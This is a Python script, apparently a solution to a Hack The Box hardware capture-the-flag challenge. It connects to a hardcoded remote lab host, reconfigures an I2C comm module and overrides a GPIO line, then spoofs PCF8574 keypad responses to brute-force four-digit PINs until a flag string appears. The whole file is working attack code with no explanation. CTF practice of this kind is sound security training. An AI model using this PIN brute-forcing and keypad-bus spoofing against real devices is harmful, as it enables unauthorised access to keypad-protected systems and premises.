import socket
import time

# Configuration for remote hosts
HOST_KEYPAD = '94.237.57.211'  # Keypad/MCU interface host
PORT_KEYPAD = 59540            # Keypad/MCU interface port
HOST_CTRL   = '94.237.57.211'  # Command/control interface host
PORT_CTRL   = 53215            # Command/control interface port

# Globals for simulating the key presses
key_presses = ''
current_key_to_send = 0

# Key-to-(row, col) mapping based on PCF8574 patterns
KEYMAP = {
    '1': ('E0', '0E'), '2': ('D0', '0E'), '3': ('B0', '0E'), 'A': ('70', '0E'),
    '4': ('E0', '0D'), '5': ('D0', '0D'), '6': ('B0', '0D'), 'B': ('70', '0D'),
    '7': ('E0', '0B'), '8': ('D0', '0B'), '9': ('B0', '0B'), 'C': ('70', '0B'),
    '*': ('E0', '07'), '0': ('D0', '07'), '#': ('B0', '07'), 'D': ('70', '07'),
}

def configure_module(ctrl_sock):
    """
    Send I2C address and GPIO override commands to the control interface
    """
    # set I2C address to 35
    ctrl_sock.sendall(b"comm-module-id")
    time.sleep(0.1)
    ctrl_sock.sendall(b"35")
    time.sleep(0.1)
    # force PCF8574 A0 low via GPIO-1
    ctrl_sock.sendall(b"GPIO")
    time.sleep(1)
    ctrl_sock.sendall(b"1 0")
    time.sleep(0.1)


def simulate_keypad_read(command):
    global current_key_to_send, key_presses
    if command == 'F0':
        key = key_presses[current_key_to_send]
        return KEYMAP[key][0] + '\n'
    elif command == '0F':
        key = key_presses[current_key_to_send]
        current_key_to_send += 1
        return KEYMAP[key][1] + '\n'
    else:
        return 'FF\n'


def interact_with_nc(ctrl_sock):
    ctrl_sock.sendall(b"system")
    time.sleep(0.2)
    resp = ctrl_sock.recv(4096).decode('utf-8')
    print("NC status:", resp.strip())
    return 'HTB{' in resp


def run_client():
    global key_presses, current_key_to_send

    # Open control interface connection
    ctrl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ctrl.connect((HOST_CTRL, PORT_CTRL))
    print("Connected to control interface.")
    # configure comm-module
    configure_module(ctrl)
    # sanity-check status
    interact_with_nc(ctrl)

    # Brute-force PINs
    for pin in range(5001, 10000):
        key_presses = f"{pin:04d}#"
        current_key_to_send = 0
        print(f"Trying PIN {key_presses}")

        # connect to keypad interface
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.connect((HOST_KEYPAD, PORT_KEYPAD))
            while current_key_to_send < len(key_presses):
                data = sock.recv(1024).decode('utf-8').strip()
                if not data:
                    break
                print(f"MC Mask: {data}")
                resp = simulate_keypad_read(data)
                sock.sendall(resp.encode('utf-8'))

        # check flag
        if interact_with_nc(ctrl):
            print("*** FLAG FOUND! ***")
            break

    ctrl.close()


if __name__ == "__main__":
    run_client()